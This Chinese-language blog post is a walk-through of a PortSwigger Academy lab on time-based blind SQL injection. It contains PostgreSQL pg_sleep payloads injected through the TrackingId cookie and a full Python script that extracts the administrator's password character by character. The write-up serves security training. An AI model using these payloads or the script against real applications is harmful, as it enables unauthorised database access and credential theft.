---
layout: post
title: "PortSwigger Academy Lab18 walk-through: Blind SQL injection with time delays and information retrieval"
subtitle: ""
date: 2026-09-30
author: "Peter"
header-img: "img/post-bg-hack.jpg"
tags: [資安, writeup, PortSwigger, SQL injection]
---

# PortSwigger Academy Lab18 walk-through: Blind SQL injection with time delays and information retrieval 

大家好，最近回歸滲透之後從 PortSwigger Lab 開始練手，在練的過程將自己的心得跟 walk-through 寫下來，歡迎交流參考。

## 題目

https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

![image-20260929160830869](/img/in-post/portswigger-lab18/image-20260929160830869.png)

如題目說明敘述， Lab18 是關於 Blind SQLi ，也就是在系統無明確的回應時，以 sleep 等等的方式觸動 SQL injection 以進行攻擊。透過閱讀題目，我們可以知道以下事項：

- 攻擊點為 `tracking cookie`
- 應用程式不會因為 SQL query 的不同而有不同回應
- 在 `users` table 下面有 `username` 與 `password` 兩 column，其中確定有一用戶名為 `administrator`
- 本 lab 的目的即為取得 `administrator` 用戶的密碼

接下來，我們將本文分成三個階段進行說明。

## Enumeration

進入頁面之後，首先我們打開 burp 並對頁面進行基礎 Enum。

在頁面攔截其中一個 request 之後我們可以發現其中使用了 `filter` 與 `TrakingId` ，除此之外在別的地方亦有如 `productId` 等等的請求，但由於題目的關係我們可以知道我們的攻擊目標為 `TrackingId` ，接著就可以試著撰寫 SQL 語法來試圖進行 injection。

![未命名](/img/in-post/portswigger-lab18/burp-request.png)

## Finding Correct SQLi Syntax

首先，透過看到 `TrackingId` 我們可以大致知道原 SQL 語法大概長這樣：

```sql
select * from TrackingIdTable where TrackingId='1bY1hvXC9szeA56i'
```

在知道基礎語法之後，我們嘗試進行 SQLi ，發現可以使用 `PostgreSQL` 語法進行注入，確認 10 秒後網頁才會回傳資料：

```sql
-- PostgreSQL
' AND (SELECT 1 FROM pg_sleep(10))=1 --
```

接著，我們修改 payload，將 payload 修改至可利用 `substring` 猜出密碼的語法，由於我們會以 python script 的方式進行，故我們將成功與否的條件皆設為 `sleep(10)` 以便盡快確認 payload 的正確性。

```sql
' AND (SELECT 1 FROM pg_sleep( CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'a')  THEN 5 ELSE 10 END))=1--
```

SQL 語法執行成功後，即可進入下一個階段 -- 利用 python script 進行 fuzzing。

## Python Scripting

根據以上內容，我們的腳本會以以下方法執行：

1. 送出 SQLi Request 至目標網站，並計算 request 所耗費的時間
2. 若 request 耗時小於 3 秒，則移至下一個 character，超過 3 秒意味著 sleep 觸發，則將該 char 記錄下來
3. 重複步驟 2 直到所有數字加字母不再被判定

整個 script 的概念很簡單，特別想提出來的點是關於 GET request 的計時問題，在實作過程中，原先使用了 python requests 內建的 `elapsed` ，但由於系統時間關係，時間會有負數的情況發生。為了解決這個情況，我們用了 time module 內的 `perf_counter` 來實現計時。

![image-20260930141454197](/img/in-post/portswigger-lab18/image-20260930141454197.png)

整體程式碼如下：

```python
import requests
import time
from string import digits, ascii_letters

url = "https://0acf006103e1218380a10dac007900ab.web-security-academy.net/filter?category=Gifts"

def check_pass():

    password = []

    for pos in range(1,25):
        for i, cha in enumerate(digits + ascii_letters):

            cookies = dict(
                TrackingId="v44mrV2xrNsW0n2p'+AND+(SELECT+1+FROM+pg_sleep(+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),+{},+1)+%3d+'{}')++THEN+4+ELSE+0+END))%3d1--".format(pos, cha),
                session=
                  "141VSkcB1AcTe9xoP9ddBAgrhUQs6nCP"
            )

            # send request
            for retries in range(3):

                print("Trying character {} at position {}.".format(cha, pos))

                global r, elapsed
                start = time.perf_counter()
                r = requests.get(url, cookies=cookies)
                elapsed = time.perf_counter() - start

                if r.status_code != 200:
                    print("Error status code encountered: {}. Retrying({}/3)...".format(r.status_code, retries+1))
                else:
                    break

            print("total elapsed seconds", elapsed)
            if elapsed < 3 and i == len(digits + ascii_letters) - 1:
                print("no possible character candidates. Returning...")
                return "".join(password)
            if elapsed < 3:
                print("request sent successfully without triggering the payload. Continue...\n")
                continue
            else:
                print("Payload triggered! Adding {} to {}. Moving to next position.".format(cha, password))
                password.append(cha)
                break

    return "".join(password)

if __name__ == '__main__':
    print("Result: ", check_pass())
```

## Exploitation

在執行腳本後，等待一段時間後即可得到結果如下：

![image-20260930143543874](/img/in-post/portswigger-lab18/image-20260930143543874.png)

將密碼輸入後即可正確地通過此 lab。

![image-20260930143607138](/img/in-post/portswigger-lab18/image-20260930143607138.png)

![image-20260930143615161](/img/in-post/portswigger-lab18/image-20260930143615161.png)